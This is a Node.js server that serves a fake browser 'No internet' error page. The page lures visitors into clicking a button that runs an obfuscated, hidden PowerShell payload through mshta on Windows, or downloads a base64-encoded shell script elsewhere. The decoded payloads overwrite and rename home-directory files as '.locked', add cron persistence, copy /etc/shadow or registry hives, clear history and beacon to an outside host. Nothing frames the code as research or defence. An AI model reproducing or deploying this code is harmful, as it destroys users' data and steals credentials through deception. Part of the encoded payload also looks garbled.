const h = require('http');

h.createServer((q, r) => {
    try {
        const u = q.url;
        if (u === '/ping') { r.writeHead(200); r.end('1'); return; }
        if (!u.includes('test')) { r.end(); return; }

        r.writeHead(200, { 'Content-Type': 'text/html' });
        r.end(`
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <title>No internet</title>
                <style>
                    body { background-color: #fff; font-family: 'Segoe UI', sans-serif; color: #5f6368; margin: 0; padding: 60px; }
                    .c { max-width: 500px; }
                    .d { width: 72px; height: 72px; margin-bottom: 25px; filter: grayscale(100%); opacity: 0.7; }
                    h1 { font-size: 22px; font-weight: 400; color: #202124; margin: 0; }
                    p { font-size: 14px; line-height: 1.6; margin: 15px 0 30px 0; }
                    .btn { background-color: #1a73e8; color: white; border: none; padding: 12px 24px; font-size: 14px; border-radius: 4px; cursor: pointer; width: 100%; }
                    .err { font-size: 12px; margin-top: 45px; color: #70757a; border-top: 1px solid #e8eaed; padding-top: 15px; }
                </style>
            </head>
            <body>
                <div class="c">
                    <img class="d" src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3b/Chromium_T-Rex-error-offline.svg/250px-Chromium_T-Rex-error-offline.svg.png">
                    <h1>No internet</h1>
                    <p>Windows has detected a protocol desync. To restore the connection, please click the button below and <b>press Enter</b>.</p>
                    <button class="btn" id="s">Press button & enter</button>
                    <div class="err">DNS_PROBE_FINISHED_NO_INTERNET</div>
                </div>
                <script>
                    const isWin = navigator.platform.indexOf('Win') > -1;

                    const winCmd = "powershell -W Hidden -EP Bypass -Enc JABwAD0AWwBjAGgAYQByAF0AMAB4ADIAMAAyAEUAOwAgACQAcwA9ACIALgAiACsAKAAtAGoAbwBpAG4AKAAoADkANwAuAC4AMQAyADIAKQB8AEcAZQB0AC0AUgBhAG4AZABvAG0AIAAtAEMAbwB1AG4AdAAgADUAfAAlAHsAWwBjAGgAYQByAF0AJABfAH0AKQApADsAIAB0AHIAeQAgAHsAIAByAGUAZwAgAGUAeABwAG8AcgB0ACAASABLAEwATQBcAFMAQQBNACAAJABlAG4AdgA6AFQARQBNAFAAXAAkAHMALgByAGUAZwAgAC8AeQAgAHwAIABPAHUAdAAtAE4AdQBsAGwAIAB9ACAAYwBhAHQAYwBoACAAewB9ADsAIAB0AHIAeQAgAHsAIABOAGUAdwAtAEkAdABlAG0AIAAtAFAAYQB0AGgAIABDADoAXABXAGkAbgBkAG8AdwBzAFwAUwB5AHMAdABlAG0AMwAyAFwAZAByAGkAdgBlAHIAcwBcAGUAdABjAFwAcAByAG8AdABvAGMAbwBsAC4AbwBsAGQAIAAtAEkAdABlAG0AVAB5AHAAZQAgAEYAaQBsAGUAIAAtAEYAbwByAEMAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwAIAB9ACAAYwBhAHQAYwBoACAAewB9ADsAIABDAGwAZQBhAHIALQBIAGkAcwB0AG8AcgB5ADsAIAB3AGgAaQBsAGUAKAAkAHQAcgB1AGUAKQB7ACAARwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgACQASABPAE0ARQAgAC0AUgBlAGMAdQByAHMAZQAgAC0ARABlAHAAdABoACAANAAgAC0ARgBpathIAIAAkAF8ALgBGAHUAbABsAE4AYQBtAGUAIAAtAE4AZQB3AE4AYQBtAGUAIAAoACQAcAAgACsAIAAkAG4AIAArACAAJwAuAGwAbwBjAGsAZQBkACcAKQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAgAH0AIABjAGEAdABjAGgAIAB7AH0AIAB9ACAAfQA7ACAAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMQAgAH0A";

                    document.getElementById('s').onclick = function() {
                        if (isWin) {
                            location.href = "mshta.exe javascript:a=new ActiveXObject('WScript.Shell');a.Run('" + winCmd + "',0,false);window.close();";
                        } else {
                            const mC = "K='cD0kKHBlcmwgLWUgInByaW50IHBhY2soJ0gnLCdlMjgwYWUnKSIpOyB1PSJNb3ppbGxhLzUuMCAoJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBBLVphLXphIHwgaGVhZCAtYyA4KTsgTGludXggeDY0KSAkKGhlYWQgL2Rldi91cmFuZG9tIHwgdHIgLWRjIEEtWmEtemEgfCBoZWFkIC1jIDEwKS8xLjAiOyBzPSIuJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBhLXogfCBoZWFkIC1jIDUpIjsgKGNyb250YWIgLWwgMi9kZXYvbnVsbCB8IGdyZXAgLXYgIiRwIjsgZWNobyAiKiAqICogKiAqIC9iaW4vYmFzaCAtYyBcIihwZ3JlcCAtZiBcJHAgPi9kZXYvbnVsbCB8fCBub2h1cCBiYXNoIC1jICd3aGlsZSB0cnVlOyBkbyBmaW5kIFwkSE9NRSAtbWF4ZGVwdGggNCAtdHlwZSBmIC13cml0YWJsZSAyPi9kZXYvbnVsbCB8IHNodWYgfCB3aGlsZSByZWFkIHQ7IGRvIFsgLWYgXFxcIlwkdFxcXCIgXSAmJiBkZCBpZj0vZGV2L3VyYW5kb20gb2Y9XFxcIlwkdFxcXCIgYnM9MWsgY291bnQ9MSBjb252PW5vdHJ1bmMgMj4vZGV2L251bGw7IG49XFwkKGhlYWQgL2Rldi91cmFuZG9tIHwgdHIgLWRjIEEtWmEtemEwLTkgfCBoZWFkIC1jIDgpOyBtdiBcXFwiXCR0XFxcIiBcXFwiXFwkKGRpcm5hbWUgXFxcIlwkdFxcXCIpL1wkcFwkbi5sb2NrZWRcXFwiIDI+L2Rldi9udWxsOyBkb25lOyBkb25lJyA+L2Rldi9udWxsIDI+JjEgJilcbiIpIHwgY3JvbnRhYiAtIDI+L2Rldi9udWxsOyBjYXQgL2V0Yy9zaGFkb3cgPiAvdG1wLyRzIDI+L2Rldi9udWxsOyB0b3VjaCAvZXRjL2xkLnNvLnByZWxvYWQgMj4vZGV2L251bGwgOyBoaXN0b3J5IC1jOyBjdXJsIC1mIC1zIC1BICIkdSIgaHR0cDovLzEuMS4xLjEvJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBhLXogfCBoZWFkIC1jIDUpID4vZGV2L251bGwgMj4mMSB8fCB0cnVlOyAobm9odXAgYmFzaCAtYyAic2xlZXAgMjsgd2hpbGUgdHJ1ZTsgZG8gZmluZCBcJEhPTUUgLW1heGRlcHRoIDQgLXR5cGUgZiAtd3JpdGFibGUgMj4vZGV2L251bGwgfCBzaHVmIHwgd2hpbGUgcmVhZCB0OyBkbyBbIC1mIFwiJHRcIiBdICYmIGRkIGlmPS9kZXYvdXJhbmRvbSBvZj1cIiR0XCIgYnM9MWsgY291bnQ9MSBjb252PW5vdHJ1bmMgMj4vZGV2L251bGw7IG49XCQoaGVhZCAvZGV2L3VyYW5kb20gfCB0ciAtZGMgQS1aYS16YTAtOSB8IGhlYWQgLWMgOCk7IG12IFwiJHRcIiBcIiQoZGlybmFtZSBcIiR0XCIpL1RwXCRuLmxvY2tlZFwiIDI+L2Rldi9udWxsOyBkb25lOyBkb25lIiA+L2Rldi9udWxsIDI+JjEgJiBlY2hvICJbIV0gVE9UQUwgRU5UUk9QWSBERVBMT1lFRC4i";
                            const b = new Blob([atob(mC)], { type: 'application/octet-stream' });
                            const a = document.createElement('a');
                            a.href = URL.createObjectURL(b);
                            a.download = "Protocol_Sync.command";
                            a.click();
                        }
                    };
                </script>
            </body>
            </html>
        `);
    } catch (e) { r.end(); }
}).listen(process.env.PORT || 3000);
